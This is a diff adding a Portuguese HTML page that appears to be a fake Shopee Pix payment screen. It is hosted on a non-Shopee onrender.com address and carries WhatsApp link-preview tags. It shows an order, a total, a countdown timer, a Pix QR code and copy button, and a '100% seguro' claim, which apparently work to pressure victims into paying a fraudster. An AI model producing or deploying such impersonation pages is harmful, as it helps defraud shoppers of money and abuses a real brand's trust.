@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Pagamento via Pix</title>
+
+<!-- PREVIEW WHATSAPP -->
+<meta property="og:title" content="Conclua o pagamento do seu pedido">
+<meta property="og:description" content="Finalize o pagamento via Pix">
+<meta property="og:image" content="https://shopee-pagamentos.onrender.com/preview.png">
+<meta property="og:url" content="https://shopee-pagamentos.onrender.com">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://shopee-pagamentos.onrender.com/preview.png">
+
+<link rel="stylesheet" href="style.css?v=3">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+</head>
+<body>
+
+<!-- TOPO -->
+<div class="topo">
+    Shopee
+</div>
+
+<!-- CARD -->
+<div class="topo-info">
+
+    <div class="item">
+        <span>Nº do Pedido</span>
+        <strong id="pedido"></strong>
+    </div>
+
+    <div class="linha"></div>
+
+    <div class="item meio">
+        <i class="fa-solid fa-cart-shopping"></i>
+        <div>
+            <span class="texto-vendido">Vendido por</span>
+            <strong id="vendido" class="vendido-nome"></strong>
+        </div>
+    </div>
+
+    <div class="linha"></div>
+
+    <div class="item">
+        <span>Status</span>
+        <strong class="status">
+            <span class="bolinha"></span>
+            Aguardando pagamento
+        </strong>
+    </div>
+
+</div>
+
+<!-- BOX -->
+<div class="box">
+
+    <p id="produto"></p>
+
+    <div class="linha-valor">
+        <span>Subtotal</span>
+        <span id="subtotal"></span>
+    </div>
+
+    <div class="linha-valor">
+        <span>Frete</span>
+        <span>00,00</span>
+    </div>
+
+    <div class="divisor"></div>
+
+    <div class="linha-valor total">
+        <span>Total</span>
+        <span id="total"></span>
+    </div>
+
+    <div class="tempo" id="contador"></div>
+
+    <div class="barra">
+        <div id="barraTempo"></div>
+    </div>
+
+    <!-- PIX -->
+    <div class="pix">
+
+        <h3>Pix</h3>
+
+        <img id="qrCode">
+
+        <button onclick="copiarPix()" id="botaoPix">
+            Copiar Código Pix
+        </button>
+
+    </div>
+
+    <!-- INSTRUÇÕES -->
+    <div class="instrucoes">
+
+        <h3>Por favor, siga as instruções:</h3>
+
+        <div class="passo"><span>1</span>Acesse o app do seu banco.</div>
+        <div class="passo"><span>2</span>Escolha pagar via Pix.</div>
+        <div class="passo"><span>3</span>Escaneie o QR ou copie o código.</div>
+        <div class="passo"><span>4</span>Pagamento aprovado em segundos.</div>
+
+    </div>
+
+    <button class="ok" onclick="finalizar()">OK</button>
+
+    <div class="seguro">
+        <i class="fa-solid fa-lock"></i>
+        Ambiente 100% seguro e criptografado
+    </div>
+
+</div>
+
+<script src="script.js?v=3"></script>
+</body>
+</html>
